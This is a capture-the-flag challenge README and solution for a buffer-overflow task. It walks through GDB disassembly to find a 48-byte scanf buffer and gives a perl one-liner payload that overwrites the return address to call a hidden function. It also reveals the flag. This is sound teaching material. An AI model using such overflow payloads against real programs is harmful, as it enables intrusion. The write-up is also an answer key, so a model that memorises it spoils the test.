# Challenge Name

## Exploded

Here's a program that I made. Seems like it works the way I want it to.

`nc <hostname> <port>`

*Creator - Noans*

## Setup Guide
1. Run `build.sh` in the service folder.

## Distribution
- stolen
    - SHA1: `6c79423c4ee2c70c07fa2ad3eb102e1d1986a5cc`
    - Compiled C binary

## Solution
The program, written in C, is vulnerable to the buffer overflow exploit.

Using GDB, disassembling the main method will give the follow output will tell us that a method called `doStuff` is run. Upon disassembling the `doStuff` method, we will see that is simply a method that prints some text and uses `scanf()` to attain user input.

Knowing this, we can thus attempt to exploit `scanf()` since it is vulnerable to buffer overflow exploits.

Using `info functions` in GDB, we can list all the functions as shown below:
```asm
(gdb) info functions
Non-debugging symbols:
0x00005555555546d8  _init
0x0000555555554700  setbuf@plt
0x0000555555554710  printf@plt
0x0000555555554720  srand@plt
0x0000555555554730  time@plt
0x0000555555554740  setvbuf@plt
0x0000555555554750  __isoc99_scanf@plt
0x0000555555554760  rand@plt
0x0000555555554770  __cxa_finalize@plt
0x0000555555554780  _start
0x00005555555547b0  deregister_tm_clones
0x00005555555547f0  register_tm_clones
0x0000555555554840  __do_global_dtors_aux
0x0000555555554880  frame_dummy
0x000055555555488a  main
0x00005555555548ed  doStuff
0x0000555555554947  interestingFunction
0x000055555555495f  randomOutput
0x00005555555549d0  __libc_csu_init
0x0000555555554a40  __libc_csu_fini
0x0000555555554a44  _fini
```

The output shows us a function called `interestingFunction` that is neither used in the main method or in `doStuff`.

Recalling the previously disassembled `doStuff` method, in the disassembly, we will see a line `0x0000555555554906 <+25>:	lea    -0x30(%rbp),%rax`. This line tells us that the variable used in the scanf method was allocated a space of 48 bytes in the stack. This thus allows us to build our exploit string.

Taking into account that the rbp is 8 bytes, we would need to write a total of 56 bytes before we can override the return address to run the interestingFunction.

Disassembling the `interestingFunction` method, we will see the following output:
```asm
Dump of assembler code for function interestingFunction:
   0x0000555555554947 <+0>:	push   %rbp
   0x0000555555554948 <+1>:	mov    %rsp,%rbp
   0x000055555555494b <+4>:	lea    0x118(%rip),%rdi        # 0x555555554a6a
   0x0000555555554952 <+11>:	mov    $0x0,%eax
   0x0000555555554957 <+16>:	callq  0x555555554710 <printf@plt>
   0x000055555555495c <+21>:	nop
   0x000055555555495d <+22>:	pop    %rbp
   0x000055555555495e <+23>:	retq
End of assembler dump.
```

Thus, our exploit string can be generated with the follow command, account for the 56 bytes we need to write and the address of `interestingFunction` after the first line.

`perl -e 'print "a"x56 . "\x48\x49\x55\x55\x55\x55\x00\x00"'`

This gives us the string `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaHIUUUU`.

With the string generated from the above, we can run `nc <hostname> <port>` and enter the string as input to get the flag.

### Flag
`GCTF{0V3R_7H3_L1M17}`
